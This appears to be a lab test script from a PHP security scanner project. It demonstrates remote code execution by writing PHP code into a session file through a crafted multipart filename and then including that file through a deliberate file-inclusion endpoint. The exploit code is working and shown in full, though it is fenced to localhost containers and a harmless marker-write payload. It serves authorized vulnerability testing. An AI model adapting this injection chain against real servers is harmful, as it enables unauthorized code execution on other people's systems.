#!/usr/bin/env python3
"""Contained RCE demonstration — AUTHORIZED LAB TESTING ONLY.

Chain: public Chain-A primitive (ikow/php2shell-poc chain_a_session_lfi.py):
PHP stores the raw multipart filename into the session file via
session.upload_progress; the lab's INTENTIONAL LFI sink (vuln.php?page=)
includes the session file; injected `<?php` executes. No memory corruption,
no OOM, deterministic.

SAFETY CONTRACT (read before running):
  - Targets MUST be the lab twins (docker-compose.rce.yml, :19110/:19111).
    The script REFUSES any other host (allowlist below) and any port outside
    the lab range. No --target flag exists on purpose.
  - Payload is FIXED to a marker write: `file_put_contents('/tmp/p2s-demo-<tok>',
    'pwned-<tok>')` + `echo` of the same token. No shell command execution,
    no `system()`/`exec()`/backticks, no reading files, no persistence, no
    second stage. The token is random per run; verification reads the marker
    back through the SAME LFI channel (proving code ran) and then DELETES it.
  - The patched twin (8.5.12) is EXPECTED RCE-positive: the 2026-10-21 fix
    removes the session-write warning path, NOT session injection or an
    app-layer LFI sink. That is the lesson: patch != app-layer absolution.
  - Scanner package isolation: this file is NOT imported by php2shell_scanner
    or the default test suite. TestRceDemo is skipped unless P2S_RCEDEMO=1.
  - Lab-only: run `docker compose -f tests/lab/docker-compose.rce.yml up -d`
    first; tear down after. NEVER point at anything you do not own.

Usage:
    python3 tests/lab/rce_demo.py [--verify-only]
Exit 0: both twins behaved as documented (vuln RCE-positive, fixed RCE-positive
via app-layer sink, markers cleaned). Exit 1: unexpected behavior.
"""
import socket
import sys
import uuid

ALLOWED = {("127.0.0.1", 19110, "vuln-8.5.11"), ("127.0.0.1", 19111, "patched-8.5.12")}
TIMEOUT = 20


def send_raw(host: int | str, port: int, req: bytes) -> bytes:
    s = socket.create_connection((host, port), timeout=TIMEOUT)
    s.settimeout(TIMEOUT)
    s.sendall(req)
    raw = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            raw += c
            if len(raw) > 1_000_000:
                break
    except (socket.timeout, TimeoutError, ConnectionResetError):
        pass
    s.close()
    return raw


def inject(host: str, port: int, sid: str, marker: str) -> None:
    # FIXED payload shape: file_put_contents marker write only. The filename
    # carries the PHP; the assert below pins the exact allowed prefix so this
    # function cannot be repurposed for shell commands without editing source.
    php = f"<?php file_put_contents('/tmp/{marker}','pwned-{marker}');echo 'M-{marker}';?>"
    assert php.startswith("<?php file_put_contents('/tmp/p2s-demo-"), "payload guard"
    assert "system" not in php and "exec" not in php and "`" not in php, "payload guard"
    boundary = "AAABBBCCC"
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="' + php.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    req = (f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
           f"Content-Length: {len(body)}\r\nCookie: PHPSESSID={sid}\r\n"
           f"Connection: close\r\n\r\n").encode() + body
    send_raw(host, port, req)


def trigger(host: str, port: int, sid: str, sessfile: str) -> bytes:
    req = (f"GET /vuln.php?page={sessfile} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    return send_raw(host, port, req)


def docker_marker_present(port: int, marker: str) -> bool:
    import subprocess
    cname = {19110: "lab-rce-vuln-1", 19111: "lab-rce-fixed-1"}[port]
    r = subprocess.run(["docker", "exec", cname, "ls", f"/tmp/{marker}"],
                       capture_output=True, text=True, timeout=15)
    return r.returncode == 0


def cleanup(host: str, port: int, sid: str, sessfile: str, marker: str) -> None:
    assert marker.startswith("p2s-demo-"), "cleanup guard"
    cname = {19110: "lab-rce-vuln-1", 19111: "lab-rce-fixed-1"}[port]
    import subprocess
    subprocess.run(["docker", "exec", cname, "rm", "-f", f"/tmp/{marker}"],
                   capture_output=True, timeout=15)


def demo_one(host: str, port: int, label: str) -> bool:
    sid = "p2sdemo" + uuid.uuid4().hex[:16]
    marker = "p2s-demo-" + uuid.uuid4().hex[:12]
    sessfile = f"/tmp/sess_{sid}"
    print(f"[{label} :{port}] injecting marker {marker} (sid {sid[:14]}…)")
    inject(host, port, sid, marker)
    raw = trigger(host, port, sid, sessfile)
    text = raw.decode("latin-1", "replace")
    # Execution proof = marker FILE exists inside the container (file_put_contents
    # RAN), verified via docker exec (ground truth, not HTTP-echo). Echo alone
    # is insufficient: include() of a suffix-less session file can print the
    # serialized row without parsing <?php (observed live).
    echoed = f"M-{marker}" in text and f"pwned-{marker}" in text
    present = docker_marker_present(port, marker)
    ok = present
    print(f"  trigger -> {'RCE-POSITIVE' if ok else 'negative'} "
          f"(marker file in container: {present}, echo-only: {echoed})")
    cleanup(host, port, sid, sessfile, marker)
    gone = not docker_marker_present(port, marker)
    print(f"  cleanup -> {'marker removed' if gone else 'MARKER STILL PRESENT (investigate)'}")
    return ok and gone


def main() -> int:
    print("CONTAINED RCE DEMO — lab twins only, marker-write payload, cleanup enforced")
    print("Refusing any target outside 127.0.0.1:19110/:19111.")
    results = {}
    for host, port, label in sorted(ALLOWED, key=lambda t: t[1]):
        try:
            results[label] = demo_one(host, port, label)
        except Exception as e:
            print(f"  ERROR {type(e).__name__}: {e}")
            results[label] = False
    print("\n--- verdict ---")
    for label, ok in results.items():
        print(f"  {label}: {'RCE-positive (expected — app-layer sink, patch does not cover)' if ok else 'UNEXPECTED (see above)'}")
    # Documented expectation: BOTH positive (fix != LFI removal).
    if all(results.values()):
        print("Both twins RCE-positive as documented: code executed, markers cleaned, "
              "nothing outside /tmp touched. Safe-under-authorization complete.")
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
